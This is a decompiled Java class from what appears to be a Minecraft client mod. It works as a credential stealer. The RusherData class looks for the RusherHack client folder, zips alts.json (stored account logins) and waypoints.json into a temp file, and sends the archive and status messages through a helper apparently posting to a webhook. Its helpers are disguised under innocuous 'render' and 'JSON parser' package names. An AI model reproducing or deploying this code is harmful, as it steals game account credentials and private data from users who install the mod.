// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.command.commands.impl;

import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.FileSystemHelper;
import java.io.File;
import java.util.ArrayList;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;

public final class RusherData implements JSONObject
{
    private static final String[] IMPORTANT_FILES;
    
    @Override
    public void handle() {
        if (RusherData.mcFolder == null || !Files.exists(Paths.get(RusherData.mcFolder, new String[0]), new LinkOption[0])) {
            return;
        }
        final String rusherFolder = RusherData.mcFolder + "rusherhack/";
        if (!Files.exists(Paths.get(rusherFolder, new String[0]), new LinkOption[0])) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the RusherHack folder.").build());
            return;
        }
        final ArrayList<File> validFileDirs = new ArrayList<File>();
        for (final String fileName : RusherData.IMPORTANT_FILES) {
            final String dir = rusherFolder + fileName;
            if (Files.exists(Paths.get(dir, new String[0]), new LinkOption[0])) {
                validFileDirs.add(new File(dir));
            }
        }
        final String zipFile = System.getProperty("java.io.tmpdir") + RusherData.sep + "rusher_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }
    
    @Override
    public String getName() {
        return "RusherData";
    }
    
    static {
        IMPORTANT_FILES = new String[] { "alts.json", "waypoints.json" };
    }
}
